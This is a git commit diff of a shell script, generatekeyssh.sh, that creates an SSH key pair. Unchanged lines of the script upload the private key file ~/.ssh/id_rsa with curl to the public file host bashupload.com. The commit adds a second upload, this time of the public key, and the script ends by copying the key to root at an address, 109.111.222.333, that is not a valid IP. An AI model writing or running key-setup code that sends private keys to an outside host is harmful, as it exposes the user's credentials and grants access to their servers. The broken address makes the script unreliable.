1198642958fdc18d01774dd8b2057c1967eaed13
lamtota40 <lamtota40@gmail.com>
2023-01-16 16:31:05 +0700

    Update generatekeyssh.sh

--- generatekeyssh.sh
+++ generatekeyssh.sh
@@ -1,5 +1,6 @@
 ssh-keygen -t rsa
 curl --upload-file ~/.ssh/id_rsa https://bashupload.com
 logname
+curl --upload-file ~/.ssh/id_rsa.pub https://bashupload.com
 hostname -I | awk '{print $1}'
 ssh-copy-id root@109.111.222.333
